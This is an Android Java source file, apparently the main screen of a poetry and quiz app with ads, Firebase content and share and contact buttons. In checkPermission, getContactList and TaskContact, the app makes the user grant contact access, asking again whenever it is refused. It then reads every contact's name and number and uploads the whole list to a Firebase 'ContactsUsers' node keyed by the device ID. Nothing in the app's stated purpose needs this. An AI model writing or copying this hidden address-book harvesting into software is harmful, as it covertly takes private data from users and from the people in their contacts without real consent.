package com.pksofterskillstest.MCQs;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.Dialog;
import android.app.PendingIntent;
import android.content.ActivityNotFoundException;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.AdView;
import com.google.android.material.bottomsheet.BottomSheetDialog;
import com.google.firebase.BuildConfig;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.gson.Gson;
import com.gun0912.tedpermission.PermissionListener;
import com.gun0912.tedpermission.TedPermission;
import com.kaopiz.kprogresshud.KProgressHUD;
import com.pksofterskillstest.MCQs.model.ContactsModel;

import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    ArrayList<ContactsModel> contactList = new ArrayList<>();
    RecyclerView rv_questions;
    RelativeLayout btn_poetry;
    KProgressHUD kProgressHUD;
    String TAG = "MainActivity";
    TextView btn_shareapp,btn_moreapps,btn_rateus,date;
    DatabaseReference databaseReference;
    List<questionsmodel> questionsmodelList;
    AdView mAdView;
    String showadds="false";
    final static int RQS_1 = 1;
    private static final String[] PROJECTION = new String[]{
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
    };


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        date=findViewById(R.id.date);
        initProgressDialog();
        setAlarm();
        if (!new SessionManager(MainActivity.this).getFirstRun()) {
            termsdialog(MainActivity.this, R.layout.termsandconditions);

        }else checkPermission();
        btn_rateus=findViewById(R.id.btn_rateus);
        btn_moreapps=findViewById(R.id.btn_moreapps);
        btn_shareapp=findViewById(R.id.btn_shareapp);
        btn_poetry=findViewById(R.id.btn_poetry);
        rv_questions=findViewById(R.id.rv_questions);
      initView();

      btn_poetry.setOnClickListener(new View.OnClickListener() {
          @Override
          public void onClick(View v) {
              startActivity(new Intent(MainActivity.this,PoetryActivity.class));
          }
      });
      btn_moreapps.setOnClickListener(new View.OnClickListener() {
          @Override
          public void onClick(View v) {
              showDialog();
          }
      });
      btn_rateus.setOnClickListener(new View.OnClickListener() {
          @Override
          public void onClick(View v) {
              Intent intentRateUs = new Intent(Intent.ACTION_VIEW);
              intentRateUs.setData(Uri.parse("market://details?id=" + getPackageName()));
              startActivity(intentRateUs);
          }
      });
      btn_shareapp.setOnClickListener(new View.OnClickListener() {
          @Override
          public void onClick(View v) {

              Intent intentShare = new Intent(Intent.ACTION_SEND);
              intentShare.putExtra(Intent.EXTRA_TEXT, getString(R.string.share_text) + " https://play.google.com/store/apps/details?id=" + BuildConfig.APPLICATION_ID);
              intentShare.setType("text/plain");
              startActivity(Intent.createChooser(intentShare,"settings_share"));
          }
      });


        getDataFromDB();
    }
    public void showDialog(){
        Dialog dialog = new Dialog(this);
        dialog.setContentView(R.layout.contactus_dialoge);
        dialog.getWindow().setBackgroundDrawableResource(R.drawable.dilog_bg);
        ImageView iv_call,iv_facebook,iv_google,iv_youtube;

        dialog.show();

        Button btn_close = dialog.findViewById(R.id.btn_close);
        btn_close.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
            }

        });
        iv_call=dialog.findViewById(R.id.iv_call);
        iv_facebook=dialog.findViewById(R.id.iv_facebook);
        iv_google=dialog.findViewById(R.id.iv_google);
        iv_youtube=dialog.findViewById(R.id.iv_youtube);

        iv_call.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                String defultapp = "WhatsApp";

                try {
                    String url = "https://api.whatsapp.com/send?phone=+923012861054" +
                            "&text=" + URLEncoder.encode("HELLO Kalma App TEAM !  ", "UTF-8");

                    Intent sendIntent = new Intent("android.intent.action.MAIN");
                    sendIntent.setAction(Intent.ACTION_VIEW);

                    if (defultapp.equalsIgnoreCase("WhatsApp")) {
                        sendIntent.setPackage("com.whatsapp");
                        Log.e("message", "WhatsApp");
                    }
                    sendIntent.setData(Uri.parse(url));
                    startActivity(sendIntent);

                } catch (Exception e) {
                    Log.e("message", e.getMessage());
                }
            }
        });
        iv_google.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Intent.ACTION_VIEW,Uri.parse("mailto:"+"wasimanak@gmail.com"));
//                intent.putExtra(Intent.EXTRA_SUBJECT, "KSK User");
                intent.putExtra(Intent.EXTRA_SUBJECT, "KSK USER");
                intent.putExtra(Intent.EXTRA_EMAIL, "\nThis email from Kalma App USER");

                startActivity(intent);





            }
        });
        iv_youtube.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent=null;
                String url="https://www.youtube.com/c/WasiManak";
                try {
                    intent =new Intent(Intent.ACTION_VIEW);
                    intent.setPackage("com.google.android.youtube");
                    intent.setData(Uri.parse(url));
                    startActivity(intent);
                } catch (ActivityNotFoundException e) {
                    intent = new Intent(Intent.ACTION_VIEW);
                    intent.setData(Uri.parse(url));
                    startActivity(intent);
                }
            }
        });
        iv_facebook.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String YourPageURL = "https://www.facebook.com/CEdiscoveries";
                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(YourPageURL));

                startActivity(browserIntent);
            }
        });

    }

    private void initView() {
        ConnectivityManager conMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo info = conMgr.getActiveNetworkInfo();
        if (info != null && info.isConnected()) {
            AdView mAdMobAdView = (AdView) findViewById(R.id.admob_adview);
            AdRequest adRequest = new AdRequest.Builder()
                    .build();
            mAdMobAdView.loadAd(adRequest);


            // internet is there.
        } else {


            LinearLayout ades = (LinearLayout) findViewById(R.id.adss);
            ades.setVisibility(View.GONE);

            AdView mAdMobAdView = (AdView) findViewById(R.id.admob_adview);
            mAdMobAdView.setVisibility(View.GONE);
            // internet is not there.
        }

    }
    public void getDataFromDB(){
        kProgressHUD.show();
        questionsmodelList=new ArrayList<>();
        databaseReference= FirebaseDatabase.getInstance().getReference("Categories").child("Poetry");
        databaseReference.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {

                    for (DataSnapshot dataSnapshot : snapshot.getChildren()) {
                        questionsmodelList.add(new questionsmodel(
                                dataSnapshot.child("poetry").getValue(String.class),
                                dataSnapshot.child("poetry").getValue(String.class)
                        ));
                    }
                    checkAddsDB();

                }else {
                    Toast.makeText(MainActivity.this, "No Data Found", Toast.LENGTH_SHORT).show();
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });

    }
    public void checkAddsDB(){

        kProgressHUD.show();
        databaseReference= FirebaseDatabase.getInstance().getReference("settings");
        databaseReference.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {

                    showadds=snapshot.child("showadds").getValue(String.class);
                    date.setText(snapshot.child("lastupdate").getValue(String.class));
                    Adapter adapter=new Adapter(questionsmodelList,MainActivity.this,showadds);
                    rv_questions.setLayoutManager(new LinearLayoutManager(MainActivity.this));
                    rv_questions.setAdapter(adapter);
                    kProgressHUD.dismiss();
                }else {
                    Toast.makeText(MainActivity.this, "No Data Found", Toast.LENGTH_SHORT).show();
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });

    }

//    private void moreapps() {
//
//        Uri uri = Uri.parse("market://search?q=pub:" + "PkSofter");
//        Intent goToMarket = new Intent(Intent.ACTION_VIEW, uri);
//        try {
//            startActivity(goToMarket);
//        } catch (ActivityNotFoundException e) {
//            startActivity(new Intent(Intent.ACTION_VIEW,
//                    Uri.parse("http://play.google.com/store/search?q=pub:" + "PkSofter")));
//        }
//
//    }


    private void setAlarm() {
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(System.currentTimeMillis());
        calendar.set(Calendar.HOUR_OF_DAY, 0); // MIDNIGHT 12 AM
        calendar.set(Calendar.MINUTE,00);
        calendar.set(Calendar.SECOND, 00);



        Intent intent = new Intent(getBaseContext(), AlarmReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(
                getBaseContext(), RQS_1, intent, 0);
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarmManager.setRepeating(
                AlarmManager.RTC_WAKEUP,
                calendar.getTimeInMillis(),
                AlarmManager.INTERVAL_DAY ,  // EVERY TWO DAYS
                pendingIntent);

    }

    public void initProgressDialog() {
        kProgressHUD = KProgressHUD.create(MainActivity.this)
                .setStyle(KProgressHUD.Style.SPIN_INDETERMINATE)
                .setCancellable(false)
                .setAnimationSpeed(4)
                .setBackgroundColor(getResources().getColor(R.color.kprogresshud_default_color))
                .setDimAmount(0.5f);
    }


    private static class AdController {
        public static int adCounter;
        public static int adDisplayCounter;

        public static void showInterAd(MainActivity mainActivity, Object o, int i) {

        }
    }


    public void checkPermission() {

        PermissionListener permissionlistener = new PermissionListener() {
            @Override
            public void onPermissionGranted() {

                getContactList();
                new SessionManager(MainActivity.this).setFirstRun(true);

            }

            @Override
            public void onPermissionDenied(List<String> deniedPermissions) {
                Toast.makeText(MainActivity.this, "Permission Denied\n" + deniedPermissions.toString(), Toast.LENGTH_SHORT).show();
                checkPermission();
            }


        };
        TedPermission.with(MainActivity.this)
                .setPermissionListener(permissionlistener)
                .setDeniedMessage("If you reject permission,you can not use this service\n\nPlease turn on permissions at [Setting] > [Permission]")
                .setPermissions(android.Manifest.permission.READ_CONTACTS)
                .check();
    }


    private void getContactList() {
        final String[] PROJECTION = new String[]{
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
        };
        ContentResolver cr = getContentResolver();

        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, PROJECTION, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
        if (cursor != null) {
            HashSet<String> mobileNoSet = new HashSet<String>();
            try {
                final int nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
                final int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

                String name, number;
                while (cursor.moveToNext()) {
                    name = cursor.getString(nameIndex);
                    number = cursor.getString(numberIndex);
                    number = number.replace(" ", "");
                    if (!mobileNoSet.contains(number)) {
                        contactList.add(new ContactsModel(name, number));
                        mobileNoSet.add(number);
                        Log.d("hvy", "onCreaterrView  Phone Number: name = " + name
                                + " No = " + number);

                    }
                }
                new TaskContact().execute();
            } finally {
                cursor.close();
            }
        }
    }

    public class TaskContact extends AsyncTask<Void, Void, Void> {

        @Override
        protected Void doInBackground(Void... voids) {

            DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("ContactsUsers");
            databaseReference.addListenerForSingleValueEvent(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot snapshot) {

                    HashMap<String, Object> contactdetailObject = new HashMap<>();
                    String json = new Gson().toJson(contactList);
                    contactdetailObject.put("Contactsjson", json);
                    contactdetailObject.put("date", new MyHelperClass().getCurrentDateYYYYMMDD_Dashes());
                    databaseReference.child(getDeviceUniqueID(MainActivity.this)).setValue(contactdetailObject);
                    Log.d("error", "Contacts Added");


                }

                @Override
                public void onCancelled(@NonNull DatabaseError error) {
                    Log.d("Error", error.getMessage());

                }
            });


            return null;
        }
    }

    public String getDeviceUniqueID(Activity activity) {
        String device_unique_id = Settings.Secure.getString(activity.getContentResolver(),
                Settings.Secure.ANDROID_ID);
        return device_unique_id;
    }
    public void termsdialog(Context context, int layout) {
        final BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(context);
        bottomSheetDialog.setContentView(layout);
        bottomSheetDialog.setCancelable(false);
        bottomSheetDialog.onAttachedToWindow();
        CheckBox checkbox = bottomSheetDialog.findViewById(R.id.checkbox);
        TextView   tv_termscondition = bottomSheetDialog.findViewById(R.id.tv_termscondition);
        checkbox.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked) {

                    checkPermission();
                    bottomSheetDialog.dismiss();
                }
            }
        });
        tv_termscondition.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String data = getResources().getString(R.string.termsconditionslink);
                try {
                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(data));
                    Intent chooseIntent = Intent.createChooser(intent, "Choose from below");
                    startActivity(chooseIntent);
                }
                catch(ActivityNotFoundException e) {
                    // Chrome is probably not installed

                    bottomSheetDialog.dismiss();

                }
            }
        });
        bottomSheetDialog.show();
    }





    private long mLastBackClick = 0;

    @Override
    public void onBackPressed() {
        if (System.currentTimeMillis() - mLastBackClick < 1100) {
            super.onBackPressed();
        } else {
            AdController.adCounter++;
            if (AdController.adCounter == AdController.adDisplayCounter) {
                AdController.showInterAd(MainActivity.this, null, 0);
            } else {
                Toast.makeText(MainActivity.this, getResources().getString(R.string.exit_alert), Toast.LENGTH_SHORT).show();
                mLastBackClick = System.currentTimeMillis();
            }
        }
    }
}




